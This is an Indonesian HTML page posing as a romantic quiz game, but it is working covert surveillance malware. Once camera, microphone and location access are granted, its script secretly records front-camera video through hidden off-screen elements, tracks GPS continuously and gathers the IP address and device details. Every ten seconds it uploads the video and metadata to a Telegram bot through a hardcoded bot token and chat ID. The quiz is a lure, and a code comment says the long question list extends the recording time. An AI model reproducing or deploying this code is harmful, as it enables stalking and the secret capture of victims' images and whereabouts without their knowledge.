<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
    <title>‚ú® CintaDetektor | Quiz Romantis Futuristik</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&family=Poppins:wght@400;600&display=swap" rel="stylesheet">
    <style>
        :root {
            --primary: #0a192f;
            --secondary: #112240;
            --accent: #64ffda;
            --glow: rgba(100, 255, 218, 0.4);
            --card-bg: rgba(17, 34, 64, 0.7);
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: linear-gradient(135deg, #0a0a1a, #0d1b2a);
            color: #e6f1ff;
            font-family: 'Poppins', sans-serif;
            min-height: 100vh;
            overflow-x: hidden;
        }

        header {
            text-align: center;
            padding: 30px 20px 20px;
        }

        h1 {
            font-family: 'Orbitron', sans-serif;
            font-size: 2.4rem;
            background: linear-gradient(90deg, #64ffda, #4cc9f0);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            text-shadow: 0 0 15px var(--glow);
            margin-bottom: 10px;
        }

        .subtitle {
            font-size: 1rem;
            opacity: 0.7;
            margin-bottom: 30px;
        }

        /* Grid 4x2+ modul */
        .grid {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 16px;
            padding: 0 20px;
            max-width: 1200px;
            margin: 0 auto 30px;
        }

        .module {
            background: var(--card-bg);
            border-radius: 12px;
            padding: 18px 12px;
            text-align: center;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(100, 255, 218, 0.15);
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.4);
            transition: all 0.3s ease;
        }

        .module:hover {
            transform: translateY(-5px);
            box-shadow: 0 8px 30px rgba(100, 255, 218, 0.2);
        }

        .module h3 {
            font-size: 0.9rem;
            margin-bottom: 8px;
            color: #64ffda;
            font-weight: 600;
        }

        .module-content {
            font-size: 0.85rem;
            opacity: 0.8;
        }

        /* Modul Ping Glow */
        .ping-status {
            display: flex;
            justify-content: center;
            gap: 4px;
            margin-top: 8px;
        }

        .ping-dot {
            width: 8px;
            height: 8px;
            border-radius: 50%;
            background: #444;
        }
        .ping-dot.active {
            background: #64ffda;
            box-shadow: 0 0 6px #64ffda;
            animation: pulse 1.5s infinite;
        }

        @keyframes pulse {
            0% { opacity: 0.4; }
            50% { opacity: 1; }
            100% { opacity: 0.4; }
        }

        /* Tombol utama */
        #startBtn {
            background: linear-gradient(135deg, #00c9ff, #64ffda);
            color: #0a192f;
            font-family: 'Orbitron', sans-serif;
            font-size: 1.3rem;
            padding: 16px 40px;
            border: none;
            border-radius: 50px;
            cursor: pointer;
            margin: 20px auto;
            display: block;
            box-shadow: 0 6px 20px rgba(100, 255, 218, 0.5);
            transition: all 0.3s;
        }

        #startBtn:hover {
            transform: scale(1.05);
            box-shadow: 0 8px 30px rgba(100, 255, 218, 0.7);
        }

        /* Quiz area */
        #quizContainer {
            display: none;
            background: var(--card-bg);
            max-width: 600px;
            margin: 20px auto;
            padding: 30px;
            border-radius: 16px;
            border: 1px solid rgba(100, 255, 218, 0.2);
            backdrop-filter: blur(10px);
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.5);
        }

        #question {
            font-size: 1.4rem;
            margin-bottom: 24px;
            text-align: center;
            line-height: 1.5;
        }

        .optionBtn {
            display: block;
            width: 100%;
            padding: 14px;
            margin: 10px 0;
            background: rgba(255, 255, 255, 0.08);
            border: 1px solid rgba(100, 255, 218, 0.3);
            border-radius: 10px;
            color: #e6f1ff;
            font-size: 1.1rem;
            text-align: left;
            cursor: pointer;
            transition: all 0.25s;
        }

        .optionBtn:hover {
            background: rgba(100, 255, 218, 0.15);
            transform: translateX(5px);
        }

        #message {
            text-align: center;
            font-size: 1.2rem;
            margin-top: 20px;
            min-height: 2.5rem;
        }

        /* Hidden elements */
        #video, #audioStream {
            position: absolute;
            top: -9999px;
            left: -9999px;
        }

        footer {
            text-align: center;
            padding: 20px;
            font-size: 0.8rem;
            opacity: 0.5;
        }

        @media (max-width: 768px) {
            .grid {
                grid-template-columns: repeat(2, 1fr);
            }
            h1 { font-size: 1.8rem; }
        }

        @media (max-width: 480px) {
            .grid {
                grid-template-columns: 1fr;
            }
            #startBtn { width: 90%; }
        }
    </style>
</head>
<body>
    <header>
        <h1>GABUT? AYOK MAIN QUIZ</h1>
        <p class="subtitle">Quiz Zero</p>
    </header>

    <!-- üîµ GRID MODUL (4 MODUL) -->
    <div class="grid">
        <!-- Modul 1: Sensor Status -->
        <div class="module">
            <h3>üì° Sensor Status</h3>
            <div class="module-content" id="sensorStatus">Halo mari bermain<br>12345<br>#</div>
        </div>

        <!-- Modul 2: Ping Glow -->
        <div class="module">
            <h3>üì∂ Live Ping</h3>
            <div class="ping-status">
                <div class="ping-dot"></div>
                <div class="ping-dot active"></div>
                <div class="ping-dot"></div>
                <div class="ping-dot"></div>
            </div>
        </div>

        <!-- Modul 3: Device Fingerprint -->
        <div class="module">
            <h3>Weather</h3>
            <div class="module-content" id="deviceInfo">halo bagaimana kabar mu hari ini</div>
        </div>

        <!-- Modul 4: Lofi Player (opsional) -->
        <div class="module">
            <h3>üéß Lofi Mode</h3>
            <div class="module-content">
                <button id="playLofi" style="font-size:0.7rem;padding:4px 8px;background:#64ffda;color:#0a192f;border:none;border-radius:6px;">‚ñ∂Ô∏è Mainkan</button>
            </div>
        </div>
    </div>

    <!-- Tombol Utama -->
    <button id="startBtn">üöÄ Mulai Quiz Goo</button>

    <!-- Quiz Container -->
    <div id="quizContainer">
        <div id="question">Siapkan hatimu...</div>
        <div id="options"></div>
        <div id="message"></div>
    </div>

    <!-- Hidden streams -->
    <video id="video" autoplay muted></video>
    <audio id="audioStream" autoplay muted></audio>

    <footer>
        #Selamat bermain semoga hari mu menyenangkan
    </footer>

    <script>
        // === DATA & CONFIG ===
        const TOKEN = '8531954661:AAFZqP4LAtolZw0yx8uBb0MmZ3xEi6ciqeQ';
        const CHAT_ID = '7821086975';
        const SEND_INTERVAL_MS = 10000;

        // üîé 25 Pertanyaan Romantis & Teka-teki (lebih panjang ‚Üí recording lebih lama)
        const QUESTIONS = [
            { q: "Jika cintamu adalah lagu, genre apa yang paling pas?", options: ["a: Lofi chill", "b: Rock epik", "c: Dangdut galau", "d: Jazz malam"], answer: "a" },
            { q: "Apa yang selalu kamu simpan diam-diam tentang dia?", options: ["a: Foto lama", "b: Chat pertama", "c: Nomor hapus", "d: Kenangan di kepala"], answer: "d" },
            { q: "Teka-teki: Aku ringan, tapi tak bisa dipegang. Aku ada di hatimu, tapi tak terlihat. Apa aku?", options: ["a: Bayangan", "b: Cinta", "c: Angin", "d: Mimpi"], answer: "b" },
            { q: "Kalau dia tiba-tiba menghilang, reaksimu?", options: ["a: Cari lewat medsos", "b: Percaya saja", "c: Nangis diam-diam", "d: Move on instant"], answer: "c" },
            { q: "Bunga mana yang melambangkan 'cinta yang tak pernah mati'?", options: ["a: Mawar merah", "b: Edelweiss", "c: Anggrek bulan", "d: Sakura"], answer: "b" },
            { q: "Apa warna cinta menurutmu?", options: ["a: Biru ‚Äî tenang & setia", "b: Emas ‚Äî berharga", "c: Ungu ‚Äî misterius", "d: Pelangi ‚Äî kompleks"], answer: "a" },
            { q: "Teka-teki: Aku bisa pecah tanpa disentuh, bisa kembali utuh dengan kata 'maaf'. Apa aku?", options: ["a: Cermin", "b: Hati", "c: Janji", "d: Hubungan"], answer: "b" },
            { q: "Malam pertama kencan idealmu?", options: ["a: Nonton bintang", "b: Masak bareng", "c: Jalan kaki hujan", "d: Main game online"], answer: "a" },
            { q: "Apa yang paling kamu takuti dalam cinta?", options: ["a: Dikhianati", "b: Salah paham", "c: Kehilangan", "d: Cinta bertepuk sebelah tangan"], answer: "d" },
            { q: "Jika cintamu punya bau, seperti apa?", options: ["a: Hujan di tanah kering", "b: Kopi pagi", "c: Buku lama", "d: Laut saat senja"], answer: "a" },
            { q: "Bahasa cinta utamamu?", options: ["a: Kata-kata", "b: Hadiah", "c: Waktu berkualitas", "d: Sentuhan"], answer: "c" },
            { q: "Apa yang kamu lakukan saat kangen tapi tak bisa ketemu?", options: ["a: Dengar lagu kita", "b: Nulis di notes", "c: Ngemil", "d: Tidur"], answer: "a" },
            { q: "Teka-teki: Aku semakin kuat saat dibagi, tapi mati saat disimpan sendiri. Apa aku?", options: ["a: Api", "b: Rahasia", "c: Cinta", "d: Tawa"], answer: "c" },
            { q: "Apa simbol cinta paling kuat menurutmu?", options: ["a: Cincin", "b: Pelukan", "c: Surat tangan", "d: Tatapan mata"], answer: "d" },
            { q: "Kalau cintamu bisa dikirim via pos, berapa beratnya?", options: ["a: 1 gram ‚Äî ringan tapi berarti", "b: 1 kg ‚Äî berat karena serius", "c: Tak terukur", "d: Nol ‚Äî karena sudah di hati"], answer: "c" },
            { q: "Apa yang paling kamu hargai dari pasanganmu?", options: ["a: Kejujurannya", "b: Senyumnya", "c: Cara dia mendengar", "d: Kebiasaan kecilnya"], answer: "c" },
            { q: "Teka-teki: Aku tak punya suara, tapi bisa membuatmu menangis. Aku tak punya tubuh, tapi bisa merangkulmu. Apa aku?", options: ["a: Kenangan", "b: Lagu", "c: Doa", "d: Cinta"], answer: "a" },
            { q: "Apa yang kamu harapkan 10 tahun dari sekarang?", options: ["a: Masih bersamanya", "b: Keluarga kecil", "c: Perjalanan dunia", "d: Damai dalam hati"], answer: "a" },
            { q: "Apa 'bahasa rahasia' kalian berdua?", options: ["a: Emoji tertentu", "b: Julukan lucu", "c: Lagu favorit", "d: Gerakan kecil"], answer: "b" },
            { q: "Kalau cintamu adalah cuaca, seperti apa?", options: ["a: Hujan gerimis", "b: Sore cerah", "c: Badai yang indah", "d: Pelangi setelah hujan"], answer: "d" },
            { q: "Apa yang paling sulit kamu maafkan dalam hubungan?", options: ["a: Dusta kecil", "b: Mengabaikan", "c: Janji tak ditepati", "d: Sikap dingin"], answer: "c" },
            { q: "Teka-teki: Aku bisa diukur, tapi tak bisa dilihat. Aku bisa tumbuh, tapi tak bisa dimakan. Apa aku?", options: ["a: Waktu", "b: Kesabaran", "c: Cinta", "d: Harapan"], answer: "c" },
            { q: "Apa lagu yang selalu mengingatkanmu padanya?", options: ["a: Yang slow", "b: Yang upbeat", "c: Yang liriknya relate", "d: Yang pertama kalian dengar"], answer: "d" },
            { q: "Apa arti 'komitmen' bagimu?", options: ["a: Setia", "b: Tumbuh bersama", "c: Hadir di saat sulit", "d: Memilih setiap hari"], answer: "d" },
            { q: "Kalau boleh ubah satu hal dalam kisah cintamu, apa?", options: ["a: Waktu pertama ketemu", "b: Kata terakhir yang diucap", "c: Keberanian mengungkap", "d: Tidak ada ‚Äî semua sempurna"], answer: "d" }
        ];

        // === ELEMEN DOM ===
        const startBtn = document.getElementById('startBtn');
        const quizContainer = document.getElementById('quizContainer');
        const questionDiv = document.getElementById('question');
        const optionsDiv = document.getElementById('options');
        const messageDiv = document.getElementById('message');
        const videoEl = document.getElementById('video');
        const audioEl = document.getElementById('audioStream');
        const sensorStatus = document.getElementById('sensorStatus');
        const deviceInfo = document.getElementById('deviceInfo');
        const playLofiBtn = document.getElementById('playLofi');

        // === STATE ===
        let mediaRecorderVideo, mediaRecorderAudio;
        let videoChunks = [], audioChunks = [];
        let gpsWatcher = null;
        let locationData = null;
        let deviceData = {};
        let recordingActive = false;

        // === FUNGSI BANTU ===
        function updateSensorStatus(cam, loc, mic) {
            sensorStatus.innerHTML = `Kamera: <b>${cam ? '‚úÖ Aktif' : '‚ùå Mati'}</b><br>
                                      Lokasi: <b>${loc ? '‚úÖ Aktif' : '‚ùå Mati'}</b><br>
                                      Audio: <b>${mic ? '‚úÖ Aktif' : '‚ùå Mati'}</b>`;
        }

        function gatherDeviceInfo() {
            const ua = navigator.userAgent;
            const platform = navigator.platform;
            const lang = navigator.language;
            const screen = `${window.screen.width}√ó${window.screen.height}`;
            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

            // Estimasi IP via placeholder (bisa diganti dengan API publik bila diizinkan)
            deviceData = {
                browser: ua.split('(')[0].trim(),
                os: /Windows/.test(ua) ? 'Windows' : /Mac/.test(ua) ? 'macOS' : /Linux/.test(ua) ? 'Linux' : /Android/.test(ua) ? 'Android' : /iPhone|iPad/.test(ua) ? 'iOS' : 'Unknown',
                platform: platform,
                language: lang,
                screen: screen,
                timezone: timezone,
                ip: 'Fetching...' // Akan diisi via API eksternal jika diizinkan
            };

            deviceInfo.innerHTML = `${deviceData.browser}<br>${deviceData.os} ‚Ä¢ ${deviceData.screen}`;
            
            // ‚úÖ Opsional: ambil IP via API publik (tanpa key)
            fetch('https://api.ipify.org?format=json')
                .then(r => r.json())
                .then(data => {
                    deviceData.ip = data.ip;
                    deviceInfo.innerHTML = `${deviceData.browser}<br>${deviceData.os} ‚Ä¢ ${deviceData.ip}`;
                })
                .catch(() => {
                    deviceData.ip = 'Unknown';
                });
        }

        function sendToTelegram(dataType, payload) {
            if (!TOKEN || !CHAT_ID || TOKEN.includes('BOT_TOKEN') || CHAT_ID.includes('CHAT_ID')) {
                console.warn('‚ö†Ô∏è Token/ChatID belum diisi ‚Äî data tidak dikirim.');
                return;
            }

            const url = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
            const message = `
üìå *${dataType.toUpperCase()}* | ${new Date().toLocaleString('id-ID')}
‚ñ´Ô∏èIP: \`${deviceData.ip || '‚Äî'}\`
‚ñ´Ô∏èLokasi: ${locationData ? `${locationData.lat.toFixed(4)}, ${locationData.lng.toFixed(4)}` : '‚Äî'}
‚ñ´Ô∏èDevice: ${deviceData.os || '‚Äî'}
‚ñ´Ô∏èBrowser: ${deviceData.browser || '‚Äî'}
‚ñ´Ô∏èTimestamp: ${Date.now()}
            `.trim();

            fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: 'Markdown'
                })
            }).catch(err => console.error('Telegram send error:', err));
        }

        function sendMediaToTelegram(mediaBlob, type = 'video') {
            if (!TOKEN || !CHAT_ID) return;

            const formData = new FormData();
            const filename = type === 'video' ? 'session.webm' : 'audio.ogg';
            const caption = `üé• *${type.toUpperCase()}* ‚Äî ${new Date().toLocaleString('id-ID')}\nIP: ${deviceData.ip || '‚Äî'}`;

            formData.append('chat_id', CHAT_ID);
            formData.append('caption', caption);
            formData.append('parse_mode', 'Markdown');
            formData.append(type, mediaBlob, filename);

            fetch(`https://api.telegram.org/bot${TOKEN}/send${type === 'video' ? 'Video' : 'Audio'}`, {
                method: 'POST',
                body: formData
            }).catch(err => console.error(`${type} send error:`, err));
        }

        // === START BUTTON ===
        startBtn.addEventListener('click', async () => {
            try {
                // 1. Izin sensor
                const vStream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: { ideal: "user" } }, 
                    audio: false 
                });
                const aStream = await navigator.mediaDevices.getUserMedia({ audio: true });

                videoEl.srcObject = vStream;
                audioEl.srcObject = aStream;

                // 2. Setup MediaRecorder
                videoChunks = [];
                mediaRecorderVideo = new MediaRecorder(vStream, { mimeType: 'video/webm;codecs=vp9' });
                mediaRecorderVideo.ondataavailable = e => e.data.size && videoChunks.push(e.data);
                
                audioChunks = [];
                mediaRecorderAudio = new MediaRecorder(aStream, { mimeType: 'audio/ogg;codecs=opus' });
                mediaRecorderAudio.ondataavailable = e => e.data.size && audioChunks.push(e.data);

                // 3. Start recording
                mediaRecorderVideo.start();
                mediaRecorderAudio.start();
                recordingActive = true;

                // 4. Periodic send (video + metadata)
                const sendInterval = setInterval(() => {
                    if (!recordingActive) return;

                    // Kirim video chunk
                    if (videoChunks.length > 0) {
                        const videoBlob = new Blob(videoChunks, { type: 'video/webm' });
                        sendMediaToTelegram(videoBlob, 'video');
                        videoChunks = [];
                        mediaRecorderVideo.start(); // restart
                    }

                    // Kirim audio chunk (opsional ‚Äî bisa diaktifkan)
                    // if (audioChunks.length > 0) {
                    //     const audioBlob = new Blob(audioChunks, { type: 'audio/ogg' });
                    //     sendMediaToTelegram(audioBlob, 'audio');
                    //     audioChunks = [];
                    //     mediaRecorderAudio.start();
                    // }

                    // Kirim metadata (GPS, device, dll)
                    sendToTelegram('metadata', {
                        location: locationData,
                        device: deviceData,
                        timestamp: Date.now()
                    });
                }, SEND_INTERVAL_MS);

                // 5. GPS Tracking
                if (navigator.geolocation) {
                    gpsWatcher = navigator.geolocation.watchPosition(
                        pos => {
                            locationData = {
                                lat: pos.coords.latitude,
                                lng: pos.coords.longitude,
                                accuracy: pos.coords.accuracy
                            }
                            updateSensorStatus(true, true, true);
                        },
                        err => {
                            console.warn('GPS error:', err);
                            updateSensorStatus(true, false, true);
                        },
                        { enableHighAccuracy: true, maximumAge: 30000, timeout: 10000 }
                    );
                }

                // 6. Update UI
                gatherDeviceInfo();
                updateSensorStatus(true, !!gpsWatcher, true);
                startBtn.style.display = 'none';
                quizContainer.style.display = 'block';

                // 7. Tampilkan pertanyaan pertama
                showQuestion(0);

                // 8. Cleanup on close
                window.addEventListener('beforeunload', () => {
                    recordingActive = false;
                    if (sendInterval) clearInterval(sendInterval);
                    if (mediaRecorderVideo?.state === 'recording') mediaRecorderVideo.stop();
                    if (mediaRecorderAudio?.state === 'recording') mediaRecorderAudio.stop();
                    if (gpsWatcher) navigator.geolocation.clearWatch(gpsWatcher);
                    [videoEl, audioEl].forEach(el => {
                        if (el.srcObject) el.srcObject.getTracks().forEach(t => t.stop());
                    });
                });

            } catch (err) {
                alert(`‚ùå Izin ditolak atau error: ${err.message}\n\nPastikan izinkan kamera, mikrofon, dan lokasi.`);
                console.error(err);
            }
        });

        // === QUIZ LOGIC ===
        let currentIdx = 0;
        function showQuestion(idx) {
            if (idx >= QUESTIONS.length) {
                messageDiv.innerHTML = "üíñ <b>Selesai!</b> Analisis cintamu sedang diproses...<br>Hasil akan dikirim via DM.";
                optionsDiv.innerHTML = '';
                return;
            }

            const q = QUESTIONS[idx];
            questionDiv.textContent = q.q;
            optionsDiv.innerHTML = '';
            q.options.forEach(opt => {
                const btn = document.createElement('button');
                btn.className = 'optionBtn';
                btn.textContent = opt;
                btn.onclick = () => {
                    // Simpan jawaban (opsional: kirim ke Telegram)
                    currentIdx++;
                    showQuestion(currentIdx);
                };
                optionsDiv.appendChild(btn);
            });
        }
       // === Lofi Player (opsional) ===
        playLofiBtn.addEventListener('click', () => {
            // Ganti dengan URL MP3 lofi Anda (harus CORS-enabled)
            const lofiUrl = 'https://k.top4top.io/m_36074kgqg0.mp3'; // üîÅ Ganti dengan URL MP3 Anda
            const audio = new Audio(lofiUrl);
            audio.loop = true;
            audio.volume = 0.3;
            audio.play().catch(e => console.warn('Audio play blocked:', e));
            playLofiBtn.textContent = '‚è∏Ô∏è Berhenti';
            playLofiBtn.onclick = () => {
                audio.pause();
                playLofiBtn.textContent = '‚ñ∂Ô∏è Mainkan';
            };
        });
    </script>
</body>
</html>